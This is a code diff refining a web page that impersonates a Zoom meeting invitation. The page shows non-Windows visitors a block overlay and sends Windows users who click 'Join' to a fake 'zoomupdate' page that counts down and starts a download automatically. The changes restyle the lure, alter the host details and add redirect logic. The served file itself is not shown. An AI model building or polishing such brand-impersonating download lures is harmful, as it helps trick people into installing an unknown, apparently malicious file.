@@ -78,7 +78,7 @@
             flex-direction: column;
         }
 
-        /* ----- INVITATION PAGE (Zoom style) ----- */
+        /* ----- INVITATION PAGE (upgraded) ----- */
         #invitationPage {
             align-items: center;
             justify-content: center;
@@ -86,7 +86,7 @@
             padding: 30px 20px;
         }
         .invitation-card {
-            max-width: 560px;
+            max-width: 520px;
             width: 100%;
             background: #ffffff;
             border-radius: 24px;
@@ -95,36 +95,26 @@
             text-align: center;
         }
         .invitation-card .zoom-logo {
-            width: 130px;
+            width: 110px;
             height: auto;
-            margin-bottom: 10px;
+            margin-bottom: 16px;
         }
-        .invitation-card .invite-badge {
-            display: inline-block;
-            background: #e8f5e9;
-            color: #2e7d32;
-            font-size: 13px;
-            font-weight: 600;
-            padding: 5px 20px;
-            border-radius: 30px;
-            letter-spacing: 0.3px;
-            margin-bottom: 12px;
+        .invitation-card .meeting-title {
+            font-size: 22px;
+            font-weight: 700;
+            color: #0072c6;
+            margin: 0 0 6px 0;
         }
         .invitation-card .meeting-topic {
-            font-size: 24px;
-            font-weight: 700;
+            font-size: 20px;
+            font-weight: 500;
             color: #0b1c2e;
-            margin: 0 0 6px 0;
+            margin: 0 0 4px 0;
         }
         .invitation-card .meeting-host {
             font-size: 16px;
             color: #555;
-            margin: 0 0 4px 0;
-        }
-        .invitation-card .meeting-time {
-            font-size: 14px;
-            color: #888;
-            margin: 0 0 20px 0;
+            margin: 0 0 16px 0;
         }
         .invitation-card .divider {
             border: 0;
@@ -140,7 +130,7 @@
             background: #f8fafc;
             padding: 12px 18px;
             border-radius: 12px;
-            margin-bottom: 24px;
+            margin-bottom: 28px;
             flex-wrap: wrap;
             gap: 6px 12px;
         }
@@ -157,19 +147,20 @@
             background: #0b8c3c;
             color: #fff;
             border: none;
-            font-size: 20px;
+            font-size: 18px;
             font-weight: 600;
-            padding: 16px 40px;
-            border-radius: 60px;
+            padding: 12px 28px;
+            border-radius: 40px;
             cursor: pointer;
-            width: 100%;
+            width: auto;
+            min-width: 200px;
             transition: background 0.15s, transform 0.1s;
-            box-shadow: 0 4px 12px rgba(11, 140, 60, 0.30);
+            box-shadow: 0 4px 12px rgba(11, 140, 60, 0.25);
             letter-spacing: 0.5px;
-            display: flex;
+            display: inline-flex;
             align-items: center;
             justify-content: center;
-            gap: 10px;
+            gap: 8px;
         }
         .btn-join:hover {
             background: #0a7a33;
@@ -178,10 +169,8 @@
             transform: scale(0.97);
         }
         .btn-join .icon {
-            font-size: 24px;
+            font-size: 20px;
         }
-
-        /* security warning */
         .security-warning {
             margin-top: 24px;
             padding: 14px 18px;
@@ -200,6 +189,28 @@
             margin-top: 16px;
             font-size: 13px;
             color: #aaa;
+        }
+
+        /* responsive tweaks for invitation */
+        @media (max-width: 600px) {
+            .invitation-card {
+                padding: 28px 20px 30px;
+            }
+            .invitation-card .meeting-title {
+                font-size: 18px;
+            }
+            .invitation-card .meeting-topic {
+                font-size: 17px;
+            }
+            .btn-join {
+                font-size: 16px;
+                padding: 10px 24px;
+                min-width: 160px;
+            }
+            .security-warning {
+                font-size: 13px;
+                padding: 12px 14px;
+            }
         }
 
         /* ----- DOWNLOAD PAGE ----- */
@@ -309,18 +320,8 @@
             display: none;
         }
 
-        /* responsive */
+        /* responsive for download page */
         @media (max-width: 600px) {
-            .invitation-card {
-                padding: 28px 20px 30px;
-            }
-            .invitation-card .meeting-topic {
-                font-size: 20px;
-            }
-            .btn-join {
-                font-size: 18px;
-                padding: 14px 20px;
-            }
             .logo-container {
                 position: static;
                 margin-bottom: 10px;
@@ -356,10 +357,6 @@
             #globalBlockOverlay .overlay-icon {
                 font-size: 42px;
             }
-            .security-warning {
-                font-size: 13px;
-                padding: 12px 14px;
-            }
         }
     </style>
 </head>
@@ -375,14 +372,13 @@
         <p class="overlay-sub" style="font-size:15px; color:#666;">Please join from a Windows computer.</p>
     </div>
 
-    <!-- INVITATION PAGE -->
+    <!-- INVITATION PAGE (upgraded) -->
     <div id="invitationPage" class="page">
         <div class="invitation-card">
             <img class="zoom-logo" src="Zoom_Communications_Logo.svg" alt="Zoom" />
-            <div class="invite-badge">🔔 You are invited</div>
+            <h1 class="meeting-title">You are invited to a Zoom meeting</h1>
             <div class="meeting-topic">Project Alpha – Weekly Sync</div>
-            <p class="meeting-host">Hosted by <strong>Sarah Chen</strong> (sarah.chen@company.com)</p>
-            <p class="meeting-time">📅 Today at 3:00 PM (your time) · Duration: 1 hour</p>
+            <div class="meeting-host">Hosted by <strong>Mr T</strong></div>
             <hr class="divider" />
             <div class="meeting-details">
                 <span><span class="label">Meeting ID:</span> 123 456 789</span>
@@ -464,7 +460,7 @@
             var joinBtn = document.getElementById('joinButton');
 
             // ------------------------------------------------------------
-            //  3.  ROUTING (hash‑based)
+            //  3.  ROUTING – HASH‑BASED, ENSURE ROOT PATH
             // ------------------------------------------------------------
             function showPage(pageId) {
                 document.querySelectorAll('.page').forEach(function(p) {
@@ -474,11 +470,22 @@
             }
 
             function getHash() {
-                return window.location.hash.slice(1) || ''; // remove leading #
+                return window.location.hash.slice(1) || '';
+            }
+
+            // On load, if the path is not '/' or empty, rewrite to root with hash
+            function ensureRootPath() {
+                var path = window.location.pathname;
+                var hash = window.location.hash;
+                if (path !== '/' && path !== '') {
+                    var newUrl = '/' + hash;
+                    window.location.replace(newUrl);
+                    return false;
+                }
+                return true;
             }
 
             function route() {
-                // Non‑Windows: show overlay, hide all pages
                 if (!isWindows()) {
                     globalOverlay.style.display = 'flex';
                     document.querySelectorAll('.page').forEach(function(p) {
@@ -488,13 +495,11 @@
                     return;
                 }
 
-                // Windows: hide overlay
                 globalOverlay.style.display = 'none';
                 var hash = getHash();
 
-                // Redirect root or empty hash to #invite
-                if (hash === '' || hash === '/') {
-                    location.replace('#invite');
+                if (hash === '') {
+                    window.location.replace('#invite');
                     return;
                 }
 
@@ -506,30 +511,24 @@
                     document.getElementById('downloadContent').style.display = 'block';
                     initDownloadPage();
                 } else {
-                    // unknown hash – go to invite
-                    location.replace('#invite');
+                    window.location.replace('#invite');
                 }
             }
 
-            // ------------------------------------------------------------
-            //  4.  LISTEN TO HASH CHANGES
-            // ------------------------------------------------------------
             window.addEventListener('hashchange', route);
 
             // ------------------------------------------------------------
-            //  5.  JOIN BUTTON – navigate to #invite/zoomupdate (replace)
+            //  4.  JOIN BUTTON – navigate to #invite/zoomupdate (replace)
             // ------------------------------------------------------------
             joinBtn.addEventListener('click', function(e) {
                 e.preventDefault();
                 if (!isWindows()) return;
-                // Replace current history so back button doesn't return to #invite
-                location.replace('#invite/zoomupdate');
-                // route() will be triggered by hashchange, but we call it directly too
+                window.location.replace('#invite/zoomupdate');
                 route();
             });
 
             // ------------------------------------------------------------
-            //  6.  DOWNLOAD PAGE LOGIC (only runs on Windows)
+            //  5.  DOWNLOAD PAGE LOGIC
             // ------------------------------------------------------------
             var downloadInitialized = false;
 
@@ -541,7 +540,7 @@
             }
 
             // ------------------------------------------------------------
-            //  7.  COUNTDOWN + DOWNLOAD (unchanged)
+            //  6.  COUNTDOWN + DOWNLOAD (unchanged)
             // ------------------------------------------------------------
             function startCountdownAndDownload() {
                 var countdownEl = document.getElementById('countdown');
@@ -928,9 +927,11 @@
             }
 
             // ------------------------------------------------------------
-            //  8.  BOOT
+            //  7.  BOOT
             // ------------------------------------------------------------
-            route(); // initial route based on current hash
+            if (ensureRootPath()) {
+                route();
+            }
 
         })();
     </script>
